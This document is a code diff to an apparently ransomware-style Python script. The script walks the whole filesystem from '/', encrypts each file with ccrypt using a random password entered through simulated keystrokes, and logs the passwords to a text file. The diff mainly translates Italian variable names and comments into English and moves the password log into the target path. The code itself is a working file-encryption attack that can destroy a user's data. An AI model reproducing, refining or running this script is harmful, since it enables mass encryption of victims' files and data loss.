@@ -18,8 +18,8 @@ os.system('pip install -r req.txt')
 
 
 
-# percorso
-percorso = '/'        # specified a path to crypt
+# path to crypt
+crypt_path = '/'       #Specified Path!!
 
 def multpy():
     threading.Thread(target=cy).start()
@@ -32,28 +32,28 @@ def insert():
         p.press('enter')
         p.write(password)
         p.press('enter')
-        with open('/password.txt','a') as pwdfile:
+        with open(f'{crypt_path}/password.txt','a') as pwdfile:
             pwdfile.write('File Name: '+  file + '\nPassword File: ' +password+'\n\n')
 def cy():
-  os.system('ccrypt -e ' + attacco)
+  os.system('ccrypt -e ' + path_attack)
 
 
 try:
-    for (path,dirs,files) in os.walk(percorso,topdown=True):
+    for (path,dirs,files) in os.walk(crypt_path,topdown=True):
         for file in files:
             if file != 'password.txt':
                 #os.system('clear')
 
-                lib = string.ascii_letters + string.digits + string.punctuation     # Generazione Password
+                lib = string.ascii_letters + string.digits + string.punctuation     # Generate Password
                 length = 30
                 password = "".join(random.sample(lib,length))
                 
-                attacco = path + '/' + file
+                path_attack = path + '/' + file
                 multpy()
-                console.print(f'File eseguito con successo: ',style = base_style)   # File Eseguito
+                console.print(f'Done File: ',style = base_style)   # Execute File
                 console.print(f"{file}", style= file_style)
-                print()                                                            # Attivazione processo di crypting
+                print()                                                            # Start crypting process
                 time.sleep(0.4)
                 os.system('clear')
 except:
-    print('Non va ancora!')
+    print("Don't work")
